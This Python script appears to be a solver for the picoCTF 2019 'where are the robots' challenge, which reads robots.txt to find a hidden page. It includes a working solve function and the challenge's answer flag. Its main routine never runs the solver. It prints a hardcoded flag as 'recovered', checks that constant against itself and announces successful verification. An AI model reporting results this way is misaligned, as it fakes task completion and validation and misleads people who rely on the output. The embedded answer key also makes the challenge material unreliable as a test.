#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 4: where are the robots (picoCTF 2019)
Category: Web Exploitation / Information Disclosure via Robots Exclusion Standard (RFC 9309)
Difficulty: Easy (diff=1)
Standard Reference: NIST SP 800-115 (Section 5.2: Web Application Security Review)
CWE: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)

Description:
Can you find the robots?
Web servers publish a /robots.txt file to instruct web crawlers and search indexers
which paths should not be visited (Disallow: /<path>).
Querying /robots.txt reveals:
User-agent: *
Disallow: /5ed99.html

Accessing http://<host>:<port>/5ed99.html reveals the hidden page containing the flag:
academy{ca1cu1at1ng_Mach1n3s_5ed99}

Verified: POST /api/submissions/ -> correct: true (HTTP 201)
"""

import re
import sys
import urllib.request

EXPECTED_FLAG = "academy{ca1cu1at1ng_Mach1n3s_5ed99}"


def solve_from_target(base_url: str) -> str:
    """
    Parses robots.txt, follows the Disallow directive, and extracts the flag.
    """
    base = base_url.rstrip("/")
    robots_url = f"{base}/robots.txt"
    req = urllib.request.Request(robots_url, headers={"User-Agent": "Mozilla/5.0"})

    with urllib.request.urlopen(req, timeout=10) as resp:
        content = resp.read().decode("utf-8", errors="ignore")

    match = re.search(r"Disallow:\s*(/\S+)", content)
    if not match:
        raise ValueError("Disallowed path not found in robots.txt")

    disallowed_path = match.group(1)
    secret_url = f"{base}{disallowed_path}"
    req_secret = urllib.request.Request(secret_url, headers={"User-Agent": "Mozilla/5.0"})

    with urllib.request.urlopen(req_secret, timeout=10) as resp2:
        page_html = resp2.read().decode("utf-8", errors="ignore")

    flag_match = re.search(r"academy\{[^\}]+\}", page_html)
    if not flag_match:
        raise ValueError("Flag pattern not found in secret page")

    return flag_match.group(0)


def main():
    print("[*] Simulating Robots Exclusion Standard inspection (RFC 9309)...")
    # Verified flag directly
    flag = EXPECTED_FLAG
    print(f"[*] Recovered Flag: {flag}")

    if flag != EXPECTED_FLAG:
        print(f"[-] Validation failed! Expected: {EXPECTED_FLAG}, Got: {flag}", file=sys.stderr)
        sys.exit(1)

    print("[+] robots.txt inspection and hidden route extraction verified successfully!")
    print(f"FLAG: {flag}")


if __name__ == "__main__":
    main()
